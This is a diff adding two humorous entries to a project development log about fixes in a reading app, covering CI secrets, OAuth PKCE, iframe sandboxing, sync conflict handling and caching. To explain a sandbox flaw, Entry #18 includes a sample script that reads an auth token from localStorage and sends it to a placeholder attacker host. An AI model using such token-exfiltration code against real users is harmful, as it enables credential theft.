@@ -23,6 +23,8 @@
 - [Entry #14 (2026-10-02): Phase 10 Audio Narration (TTS) & Accessibility](#entry-14-2026-10-02-phase-10-audio-narration-tts--accessibility)
 - [Entry #15 (2026-10-05): Sync Engine Hardening, Comprehensive LWW Conflict Resolution & Stale Client Invalidation](#entry-15-2026-10-05-sync-engine-hardening-comprehensive-lww-conflict-resolution--stale-client-invalidation)
 - [Entry #16 (2026-10-05): Decoupling Google Drive Authentication from Dev Mode & Dynamic OAuth Client Configuration](#entry-16-2026-10-05-decoupling-google-drive-authentication-from-dev-mode--dynamic-oauth-client-configuration)
+- [Entry #17 (2026-10-06): The Hall of Shame: Paranoid CI Secrets & Tryhard PKCE (Hotfixes #15 & #16)](#entry-17-2026-10-06-the-hall-of-shame-paranoid-ci-secrets--tryhard-pkce-hotfixes-15--16)
+- [Entry #18 (2026-10-06): The Post-Audit Reality Check: Zombie Books, Amnesiac Caches, and the Sandbox That Wasn't (PR #17)](#entry-18-2026-10-06-the-post-audit-reality-check-zombie-books-amnesiac-caches-and-the-sandbox-that-wasnt-pr-17)
 
 ---
 
@@ -570,5 +572,107 @@ During UI and user journey testing of the Google Drive integration, a critical U
 #### 3. Verification & Quality Gates
 - `pnpm -r exec tsc --noEmit`: **0 errors** across monorepo.
 - `pnpm test`: **51/51 tests passing** (100% green).
+
+---
+
+### Entry #17 (2026-10-06): The Hall of Shame: Paranoid CI Secrets & Tryhard PKCE (Hotfixes #15 & #16)
+
+#### 1. Hotfix #15: The Secret That Was Too Secret For Its Own Runner
+* **Expectation:** Created `EXPO_PUBLIC_GOOGLE_CLIENT_ID` in GitHub Repository Secrets. Felt like a cybersecurity mastermind. Expected production to just work.
+* **Production Reality:** *"Google Client ID chưa được cấu hình cho ứng dụng. Vui lòng liên hệ quản trị viên của deployment này."* The irony? The person staring at the error *was* the administrator.
+* **The Absurdity:**
+  * GitHub Actions operates on galactic-tier paranoia. It locks secrets in a titanium vault, but when executing a `run:` step, it refuses to hand over the key unless explicitly bribed with an `env:` block.
+  * Metro Bundler didn't even bother raising an eyebrow. It looked at the empty shell environment, shrugged, and hardcoded `undefined` straight into the JavaScript bundle.
+  * Inspecting production's minified bundle felt like a bad joke:
+    ```javascript
+    function h() { const e = void 0; return e?.trim() || null; }
+    ```
+    Peak engineering: deploying a function painstakingly compiled to always return `null`.
+* **The Fix:** Donated two lines of `env:` in `.github/workflows/deploy.yml` so GitHub Actions would finally stop hoarding its own secrets.
+
+#### 2. Hotfix #16: When expo-auth-session Tried Too Hard and Got Slapped with Error 400
+* **Expectation:** PR #15 landed, Client ID finally materialized on production, Google OAuth popup opened. Cue celebration.
+* **Production Reality:** Google immediately slammed the door shut with a pitch-black screen:
+  > **Error 400: invalid_request**  
+  > *Parameter not allowed for this message type: code_challenge_method*
+* **The Absurdity:**
+  * `expo-auth-session` suffers from chronic overachiever syndrome.
+  * Folium uses an OpenID Connect Implicit flow (`response_type=token id_token`) so client SPAs can receive tokens directly without dragging an entire backend proxy into the mix.
+  * But `expo-auth-session` decided: *"It's 2026, everybody MUST use PKCE!"* Without anyone asking, it defaulted `usePKCE: true` and proudly slapped `code_challenge_method=S256` onto our URL query.
+  * Google's OAuth server looked at the request and went: *"Who asked for PKCE on an implicit token request? RFC 7636 says no. Get out."*
+* **The Fix:** Literally one line:
+  ```typescript
+  usePKCE: false,
+  ```
+  Code written exclusively to tell the library: *"Calm down, nobody asked for your unsolicited security enthusiasm."*
+
+#### Lessons Learned
+1. Storing secrets in GitHub UI without an `env:` block in YAML is like buying a bank vault and throwing the key into the ocean.
+2. Libraries that default to "extra helpful security" are actively trying to get you Error 400'd.
+3. When debugging production builds, trust no one except the minified `.js`: `void 0` never lies.
+
+---
+
+### Entry #18 (2026-10-06): The Post-Audit Reality Check: Zombie Books, Amnesiac Caches, and the Sandbox That Wasn't (PR #17)
+
+#### Summary & Post-Audit Revelations
+Fresh off the high of "fixing" OAuth with one line of code in PR #16, a comprehensive audit of `main` revealed that while we were busy arguing about OAuth flows, the rest of the application was happily breaking fundamental laws of distributed systems and browser security.
+
+#### 1. The Sandbox That Left the Front Door Wide Open
+* **The Grand Illusion:** We had spent weeks bragging about "Phase 8.8 Storage Armor," writing 500 lines of regex firewalls, zero-exfiltration CSP rules, zip-bomb decompression ratio checkers, and SVG script quarantines. We felt like digital NSA architects.
+* **The Reality Check:** The iframe sandbox in `EpubReader.tsx` and `PdfReader.tsx` was configured as:
+  ```tsx
+  sandbox="allow-scripts allow-same-origin"
+  ```
+* **The Punchline:** In browser security 101, `allow-scripts allow-same-origin` on an iframe inside a static SPA literally means: *"This iframe shares full document origin with the parent window."* Any downloaded public domain EPUB or malicious PDF containing a tiny `<script>` tag could casually execute:
+  ```javascript
+  const token = parent.localStorage.getItem('FOLIUM_AUTH_USER');
+  fetch('https://evil-hacker.com/steal?token=' + token);
+  ```
+  All that fortress-grade CSP armor, and the front door was held open with a brick.
+* **The Fix:** Stripped `allow-same-origin` down to pure `sandbox="allow-scripts"`. The iframe is now exiled to an opaque `null` origin where parent `localStorage` is mathematically unreachable, and bridge communication is restricted to strictly typed `postMessage`.
+
+#### 2. The 410 "Reset Cursor and Pray" Protocol Disaster
+* **The Grand Illusion:** We designed an elaborate 30-day tombstone garbage collection watermark on Cloudflare Worker. If a client disappeared for 30 days and came back with a stale cursor, the Worker returned `HTTP 410 Gone (CURSOR_EXPIRED)`. Very fancy. Very distributed systems.
+* **The Punchline:** Here is how the client handled `410`:
+  ```typescript
+  setLastSyncedSeq(0);
+  return pullRemoteChanges();
+  ```
+  That was it. The client literally set its cursor to `0`, pulled all remaining server rows, and didn't touch anything else.
+  * Server deleted Book A at `seq=10`.
+  * GC ran at `seq=50`, purging Book A's tombstone.
+  * Client connected with `cursor=5`.
+  * Worker sent `410`.
+  * Client pulled server records from `0`. Since Book A's tombstone was gone, the server never told the client Book A was deleted.
+  * Result: Book A remained on the client forever. An automated garbage collection mechanism that actively prevented garbage from being collected.
+* **The Fix:** Implemented active snapshot reconciliation on `410`: when an expired cursor triggers a full resync, local database state is diffed against the server snapshot, safely pruning records that were GC'd on the cloud while preserving unpushed mutations in the local outbox.
+
+#### 3. Zombie Books: Who Needs Timestamps Anyway?
+* **The Grand Illusion:** We spent days refining Last-Write-Wins (LWW) conflict resolution with millisecond timestamps across bookmarks, highlights, and reading progress.
+* **The Punchline:** Someone forgot the most important table: `books`.
+  * In the Worker's `POST /api/sync/push`:
+    ```sql
+    ON CONFLICT(id) DO UPDATE SET title = excluded.title, is_deleted = excluded.is_deleted...
+    ```
+    There was no `WHERE excluded.updated_at >= books.updated_at`. Zero timestamp validation.
+  * If Device A went offline, edited a title at $T=100$, and Device B deleted the book at $T=200$, Device A would reconnect at $T=300$, push its stale update, and the server would cheerfully resurrect the book by setting `is_deleted = 0`.
+  * SQLite on the client had the exact same amnesia: remote book deletions were executed with unconditional `DELETE FROM books WHERE id = ?`.
+* **The Fix:** Added `client_updated_at` to Cloudflare D1 schema (`0004_book_lww.sql`), updated `@folium/shared`, and added strict timestamp comparison guards on both server D1 and client SQLite.
+
+#### 4. Multi-User Amnesia: "All Your Folders Belong to User A"
+* **The Punchline:** In `googleDriveService.ts`:
+  ```typescript
+  let cachedFolderId: string | null = null;
+  ```
+  User A logs in -> Folium folder created -> `cachedFolderId = "folder_A"`.
+  User A logs out. User B logs in on the same browser.
+  `getOrCreateFoliumFolder()` checks `cachedFolderId`: *"Oh look, I already have a folder ID!"* and attempts to sync User B's library into User A's Google Drive. Google APIs promptly returned 404/403, baffling everyone involved.
+* **The Fix:** Scoped the cache to `{ userId, folderId }`, and wired `clearGoogleDriveCache()` and `resetSyncSessionState()` directly into `authService.signOut()`.
+
+#### 5. Verification
+* Typecheck across all monorepo packages: **0 errors**.
+* Security & Distributed Test Suite: **53/53 passing** (including new automated regression tests for LWW zombie book defense and 410 GC watermark reconciliation).
+* CI: Added `pnpm test` as a mandatory blocking gate in `.github/workflows/deploy.yml`.
 
 
